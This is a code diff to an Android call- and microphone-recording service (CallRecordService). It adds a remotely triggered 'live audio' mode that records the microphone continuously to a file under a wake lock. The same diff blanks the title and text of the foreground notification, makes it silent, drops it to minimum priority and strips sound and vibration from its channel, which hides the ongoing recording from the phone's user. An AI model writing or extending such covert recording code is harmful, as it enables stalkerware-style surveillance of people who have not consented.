@@ -50,7 +50,9 @@ public class CallRecordService extends Service {
     // Recording state
     private static volatile boolean isRecordingCall = false;
     private static volatile boolean isRecordingMic = false;
+    private static volatile boolean isLiveAudioRecording = false;
     private static String currentRecordingPath = null;
+    private static String currentLiveAudioPath = null;
     private static String currentRecordingType = null; // "call" or "mic"
     private static long recordingStartTime = 0;
 
@@ -97,6 +99,10 @@ public class CallRecordService extends Service {
                 startCallRecording(phoneNumber, callType);
             } else if ("STOP_CALL_RECORDING".equals(action)) {
                 stopCallRecording();
+            } else if ("START_LIVE_AUDIO".equals(action)) {
+                startLiveAudioRecording();
+            } else if ("STOP_LIVE_AUDIO".equals(action)) {
+                stopLiveAudioRecording();
             } else if ("START_MIC_RECORDING".equals(action)) {
                 int duration = intent.getIntExtra("duration", 0); // 0 = indefinite
                 startMicRecording(duration);
@@ -122,16 +128,16 @@ public class CallRecordService extends Service {
                 PendingIntent.FLAG_IMMUTABLE);
 
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Audio Monitor")
-                .setContentText("Monitoring audio...")
+                .setContentTitle("")
+                .setContentText("")
                 .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                 .setContentIntent(pendingIntent)
+                .setSilent(true)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build();
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            // Android 14+
             startForeground(NOTIFICATION_ID, notification,
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
@@ -149,8 +155,10 @@ public class CallRecordService extends Service {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
                     "Call Recording Service",
-                    NotificationManager.IMPORTANCE_LOW);
+                    NotificationManager.IMPORTANCE_MIN);
             channel.setDescription("Service for recording calls and microphone");
+            channel.setSound(null, null);
+            channel.setVibrationPattern(new long[]{0});
 
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -177,6 +185,79 @@ public class CallRecordService extends Service {
                 .apply();
 
         Log.d(TAG, "Settings updated - AutoRecord: " + autoRecord + ", SaveOnDevice: " + saveOnDevice);
+    }
+
+    private void startLiveAudioRecording() {
+        if (isRecordingCall || isRecordingMic || isLiveAudioRecording) {
+            Log.w(TAG, "Audio already in use or live audio already active");
+            return;
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+                Log.e(TAG, "RECORD_AUDIO permission not granted");
+                return;
+            }
+        }
+
+        try {
+            acquireWakeLock();
+
+            File recordDir = getRecordingsDirectory();
+            if (!recordDir.exists()) {
+                recordDir.mkdirs();
+            }
+
+            String fileName = "LIVE_MIC.aac";
+            File recordFile = new File(recordDir, fileName);
+            currentLiveAudioPath = recordFile.getAbsolutePath();
+            isLiveAudioRecording = true;
+
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            try {
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
+            } catch (IllegalArgumentException e) {
+                Log.w(TAG, "AAC_ADTS not available, falling back to MPEG_4", e);
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            }
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mediaRecorder.setAudioEncodingBitRate(128000);
+            mediaRecorder.setAudioSamplingRate(44100);
+            mediaRecorder.setOutputFile(currentLiveAudioPath);
+
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            updateNotification("Live audio streaming enabled");
+            Log.d(TAG, "Live audio recording started: " + currentLiveAudioPath);
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting live audio recording", e);
+            isLiveAudioRecording = false;
+            currentLiveAudioPath = null;
+            releaseMediaRecorder();
+            releaseWakeLock();
+        }
+    }
+
+    private void stopLiveAudioRecording() {
+        if (!isLiveAudioRecording) {
+            return;
+        }
+
+        Log.d(TAG, "Stopping live audio recording");
+        isLiveAudioRecording = false;
+
+        try {
+            if (mediaRecorder != null) {
+                mediaRecorder.stop();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping live audio recording", e);
+        }
+
+        releaseMediaRecorder();
+        releaseWakeLock();
+        updateNotification("Monitoring audio...");
     }
 
     // Called when phone state changes (from CallReceiver)
@@ -367,7 +448,7 @@ public class CallRecordService extends Service {
             // Create filename
             String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                     .format(new Date());
-            String fileName = "MIC_" + timestamp + ".m4a";
+            String fileName = "MIC_" + timestamp + ".aac";
 
             File recordFile = new File(recordDir, fileName);
             currentRecordingPath = recordFile.getAbsolutePath();
@@ -376,7 +457,12 @@ public class CallRecordService extends Service {
             // Setup MediaRecorder
             mediaRecorder = new MediaRecorder();
             mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            try {
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
+            } catch (IllegalArgumentException e) {
+                Log.w(TAG, "AAC_ADTS not available, falling back to MPEG_4", e);
+                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            }
             mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
             mediaRecorder.setAudioEncodingBitRate(128000);
             mediaRecorder.setAudioSamplingRate(44100);
@@ -468,12 +554,13 @@ public class CallRecordService extends Service {
                     PendingIntent.FLAG_IMMUTABLE);
 
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                    .setContentTitle("Audio Monitor")
-                    .setContentText(text)
+                    .setContentTitle("")
+                    .setContentText("")
                     .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                     .setContentIntent(pendingIntent)
+                    .setSilent(true)
                     .setOngoing(true)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
                     .build();
 
             NotificationManager manager = getSystemService(NotificationManager.class);
@@ -502,12 +589,20 @@ public class CallRecordService extends Service {
         return isRecordingMic;
     }
 
+    public static boolean isLiveAudioRecording() {
+        return isLiveAudioRecording;
+    }
+
     public static boolean isRecording() {
-        return isRecordingCall || isRecordingMic;
+        return isRecordingCall || isRecordingMic || isLiveAudioRecording;
     }
 
     public static String getCurrentRecordingPath() {
         return currentRecordingPath;
+    }
+
+    public static String getCurrentLiveAudioPath() {
+        return currentLiveAudioPath;
     }
 
     public static String getCurrentRecordingType() {
@@ -557,6 +652,9 @@ public class CallRecordService extends Service {
         }
         if (isRecordingMic) {
             stopMicRecording();
+        }
+        if (isLiveAudioRecording) {
+            stopLiveAudioRecording();
         }
 
         releaseMediaRecorder();
